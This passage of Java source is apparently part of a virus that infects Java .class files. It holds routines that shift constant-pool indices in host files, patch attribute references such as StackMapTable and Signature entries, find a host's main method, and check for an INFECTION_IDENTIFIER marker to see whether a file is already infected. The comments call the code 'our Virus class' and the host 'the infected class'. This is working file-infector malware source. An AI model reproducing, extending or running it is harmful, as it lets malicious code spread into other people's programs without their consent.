					for (int i = 0; i < number_of_classes; ++i) {
						_____increase2Index(bytes, index, change_amount);
						index += 2;

						_____increase2Index(bytes, index, change_amount);
						index += 2;

						_____increase2Index(bytes, index, change_amount);
						index += 4;
					}
				}
				else if (attribute_name.equals("MethodParameters")) {
					//System.out.println("attribute_info MethodParameters updated");
					int parameters_count = bytes[index];
					index += 1;

					for (int i = 0; i < parameters_count; ++i) {
						_____increase2Index(bytes, index, change_amount);
						index += 4;
					}
				}
				else if (attribute_name.equals("LineNumberTable")) {
					//System.out.println("attribute_info LineNumberTable updated");
					int line_number_table_length = _____bytes2(bytes, index);
					index += 2;
					index += 4 * line_number_table_length;
				}
				else if (attribute_name.equals("Signature")) {
					//System.out.println("attribute_info Signature updated");
					_____increase2Index(bytes, index, change_amount);
					index += 2;
				}
				else {
					//System.out.println("Not defined for " + attribute_name);
				}
			}
			else {
				System.err.println("Unknown attribute_name_index <" + attributes_name_index + ">, length = " + attribute_length + ".");
				index += attribute_length;
			}
		}

		if (out != null) {
			int writeLen = (attribute_length + 6) - (index - old_index);
			if (writeLen != 0){
				/*
				 * 0 len writes produce an error.
				 * If the len is negative we _want_ an error to be thrown.
				 */
				out.write(bytes, index, writeLen);
			}
		}
		
		return old_index + 6 + attribute_length;
	}

	/**
	 * verification_type_info
	 * @param bytes
	 * @param index
	 * @param change_amount
	 */
	private static int _____update_verification_type_info(byte bytes[], int index, int change_amount) {
		int vti_tag = bytes[index];
		index += 1;

		/* ITEM_Object */
		if (vti_tag == 7) {
			//int original = _____bytes2(bytes, index);
			//System.out.println("index = " + index + ", Original = " + original + ", new = " + (original + change_amount) + ", change = " + change_amount);

			_____increase2Index(bytes, index, change_amount);
			index += 2;
		}

		/* ITEM_Uninitialized */
		if (vti_tag == 8) {
			index += 2;
		}
		return index;
	}

	/**
	 * 
	 * @param byte_index Byte index of the constant_pool entry.
	 * @param data_bytes The data.
	 * @param change_amount The amount we want to add to every constant_pool reference.
	 * @return
	 */
	private static int _____increaseConstantPoolEntryRefs(int byte_index, byte data_bytes[], int change_amount) {
		int type = data_bytes[byte_index];
		++byte_index;

		switch (type) {
		case CONSTANT_Class:
		case CONSTANT_String:
		case CONSTANT_MethodType:
			_____increase2Index(data_bytes, byte_index, change_amount);
			byte_index += 2;
			break;
		case CONSTANT_Fieldref:
		case CONSTANT_Methodref:
		case CONSTANT_InterfaceMethodref:
		case CONSTANT_NameAndType:
			/*int name_index = */_____increase2Index(data_bytes, byte_index, change_amount);
			byte_index += 2;

			/*int descriptor_index = */_____increase2Index(data_bytes, byte_index, change_amount);
			byte_index += 2;
			break;
		case CONSTANT_MethodHandle:
			byte_index += 1;
			_____increase2Index(data_bytes, byte_index, change_amount);
			byte_index += 2;
			break;
		case CONSTANT_InvokeDynamic:
			byte_index += 2;
			_____increase2Index(data_bytes, byte_index, change_amount);
			byte_index += 2;
			break;
		/*
		 * Ones without updates.
		 */
		case CONSTANT_Utf8:
			int strlen = _____bytes2(data_bytes, byte_index);
			byte_index += 2 + strlen;
			break;
		case CONSTANT_Integer:
		case CONSTANT_Float:
			byte_index += 4;
			break;
		case CONSTANT_Long:
		case CONSTANT_Double:
			byte_index += 8;
			break;
		default:
			System.err.println("UNKNOWN TAG TYPE = " + type);
			break;
		}
		return byte_index;
	}

	private static int _____increase2Index(byte data_bytes[], int byte_index, int change_amount) {
		int index_value = _____bytes2(data_bytes, byte_index);

		//Skip references to our class structure (so functions identify as part of the infected class, not our Virus class).
		//TODO: May not be required.
		//TODO: This relies on the fact that the class is first constant_pool entry
		if (index_value == 1) {
			return 1;
		}

		index_value += change_amount;
		byte bytes[] = _____intTo2Bytes(index_value);
		data_bytes[byte_index] = bytes[0];
		data_bytes[byte_index + 1] = bytes[1];
		return index_value;
	}

	/**
	 * 
	 * @return
	 * null if the file isn't a class file.
	 * 
	 * retval[][] otherwise,
	 * where retval[0] = {
	 * [-1, constant_pool_count, constant_pool_end, 0, main_index] if the file isn't infected.
	 * Where
	 * 		-1 == -1;
	 * 		constant_pool_count = The total number of constant_pool entries in this file (constant_pool_count - 1). 
	 *		constant_pool_end = Byte offset of the end of the constant_pool.
	 *		0
	 *		main_index = Byte offset of the main() function. -1 if doesn't exist.
	 *	
	 * [INFECTED_constant_pool_count, constant_pool_count, constant_pool_end, offset_of_INFECTION_IDENTIFIER, main_index]
	 * Where
	 *		INFECTED_constant_pool_count = Positive integer. Number constant_pool entries belonging to the infection.
	 *		constant_pool_count = The total number of constant_pool entries in this file (constant_pool_count - 1).
	 *		constant_pool_end = Byte offset of the end of the constant_pool.
	 *		offset_of_INFECTION_IDENTIFIER = The byte offset of INFECTION_IDENTIFIER entry in the constant_pool.
	 *		main_index = Byte offset of the String portion UTF8 belonging to the main() function. -1 if doesn't exist.
	 * }
	 * and retval[1] = An array of byte indices; one for each constant pool entry,
	 * 	 plus one entry for the first byte _after_ constant table.
	 * 
	 * @param constant_lookup	A hashmap of all UTF8's and their constant_pool indices.
	 * 							For use later when looking up special names such as "Code".
	 *
	 * @throws IOException 
	 */
	private static int[][] _____isFileInfected(byte bytes[], HashMap<Integer, String> UTF8_lookup) throws IOException {
		/*
		 * We first assume the file isn't infected.
		 */
		int indices[] = new int[5];
		indices[0] = -1;
		indices[3] = 0;
		indices[4] = -1;

		/*
		 * Get the constant_pool_count - 1.
		 */
		final int constant_pool_count = _____bytes2(bytes, 8) - 1;
		indices[1] = constant_pool_count;

		/*
		 * Initialise the constant_pool_offsets array.
		 */
		int constant_pool_offsets[] = new int[constant_pool_count + 1];
		constant_pool_offsets[0] = 10;

		for (int i = 0; i < constant_pool_offsets.length - 1; ++i) {
			int index = constant_pool_offsets[i];

			/*
			 * Get the index of the next constant_pool entry.
			 */
			constant_pool_offsets[i + 1] = _____increaseConstantPoolEntryRefs(index, bytes, 0);

			/*
			 * Check if this constant_pool entry is UTF8.
			 */
			String str = _____parseCONSTANT_Utf8(bytes, index);
			if (str != null) {
				/*
				 * Save the UTF8 in our lookup table.
				 */
				if (UTF8_lookup != null) {
					//TODO: NOTE: this may need to be +1. Depends on whether we want it 0 or 1 indexed.
					UTF8_lookup.put((i + 1), str);
				}

				/*
				 * Check if this UTF8 is the name of the main function.
				 * TODO: NOTE: This may not actually be the name of the main function.
				 * There's seemingly no Methodref for main, so we can't really tell just by looking.
				 */
				if (str.equals("main")) {
					indices[4] = index + 3;
				}

				/*
				 * Check if this UTF8 is our INFECTION_IDENTIFIER.
				 */
				if (str.equals(INFECTION_IDENTIFIER)) {
					/*
					 * Note down the byte index of the INFECTION_IDENTIFIER.
					 */
					//indices[3] = index;
					indices[3] = constant_pool_offsets[i - 1];//We do this because the UTF8 is the SECOND entry, not the first

					/*
					 * Note down the number of infected constant_pool entries.
					 */
					indices[0] = constant_pool_count - i + 1;
				}
			}
		}
		indices[2] = constant_pool_offsets[constant_pool_offsets.length - 1];

		/*
		 * Return
		 */
		return new int[][] { indices, constant_pool_offsets };
	}

	/*
	 * Constant entry stuff--------------------------------------------------
	 */

	/**
	 * Check if a constant_pool entry is UTF8.
	 * If it is return a String representation of it.
	 * @param bytes
	 * @param index Index of the start of the constant_pool entry.
	 * @return null if not UTF8. Else return a String representation of the UTF8.
	 */
	private static String _____parseCONSTANT_Utf8(byte bytes[], int index) {
		if (bytes[index] != CONSTANT_Utf8) {
			return null;
		}
		final int strlen = _____bytes2(bytes, index + 1);
		return _____parseCONSTANT_Utf8(bytes, index + 3, strlen);
	}

	/**
	 * 
	 * @param bytes
	 * @param index
	 * @param length
	 * @return
	 */
	private static String _____parseCONSTANT_Utf8(byte bytes[], int index, int length) {
		//<convert to str hopefully>
		int strIndex = index + length;
		char str[] = new char[length];
		for (--length, --strIndex; length >= 0; --length, --strIndex) {
			str[length] = (char) bytes[strIndex];
		}
		//</convert to str hopefully>
		return new String(str);
	}

	/*
	 * Bytes stuff--------------------------------------------------
	 */

	/**
	 * Read 4 consecutive bytes from the array and treat it as an integer.
	 * @param array The byte array.
	 * @param index The index (in number of bytes) to start reading.
	 * @return
	 */
	private static int _____bytes4(byte array[], int index) {
		return (array[index] << (3 * 8) & 0xFF000000)
				| (array[index + 1] << (2 * 8) & 0x00FF0000)
				| (array[index + 2] << (1 * 8) & 0x0000FF00)
				| (array[index + 3] & 0x000000FF);
	}

	/**
	 * Read 2 consecutive bytes from the array and treat it as an integer.
	 * @param array The byte array.
	 * @param index The index (in number of bytes) to start reading.
	 * @return
	 */
	private static int _____bytes2(byte array[], int index) {
		return (array[index] << (1 * 8) & 0x0000FF00)
				| (array[index + 1] & 0x000000FF);
	}

	/**
	 * Converts an integer to an array of 2 bytes.
	 */
	private static byte[] _____intTo2Bytes(int val) {
		return _____intToBytes(val, 2);
	}

	/**
	 * Converts an integer to an array of 4 bytes.
	 */
	private static byte[] _____intTo4Bytes(int val) {
		return _____intToBytes(val, 4);
	}

	private static byte[] _____intToBytes(int val, int num_bytes) {
		byte array[] = new byte[num_bytes];
		int i = 0;
		int j = array.length - 1;//Using i instead of j in the following code would change the endianness
		for (; i < array.length; ++i, --j) {
			array[i] = (byte) ((val >> j * 8) & 0xFF);
		}
		return array;
	}
}